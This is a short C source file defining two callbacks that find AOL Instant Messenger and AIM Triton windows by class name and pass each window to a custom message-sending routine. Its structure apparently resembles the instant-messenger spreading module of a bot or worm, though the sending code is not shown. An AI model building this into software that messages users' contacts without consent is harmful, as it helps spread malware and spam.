#include "includes.h"

#ifndef NO_AIM

BOOL CALLBACK Aim(HWND hwnd, LPARAM lpParam)
{
	int iWindow = 0;
	char szClassName[50] = {0};

	GetClassName(hwnd, szClassName, sizeof(szClassName));
	if(!strcmp(szClassName, "_Oscar_StatusNotify"))
		iWindow = 1;

	SendMessage(hwnd, iWindow);

    return TRUE;
}

BOOL CALLBACK AimTriton(HWND hwnd, LPARAM lpParam)
{
	int iWindow = 0;
	char szClassName[50] = {0};

	GetClassName(hwnd, szClassName, sizeof(szClassName));
	if(!strcmp(szClassName, "__oxFrame.class__"))
		iWindow = 1;

	SendMessage(hwnd, iWindow);

    return TRUE;
}
#endif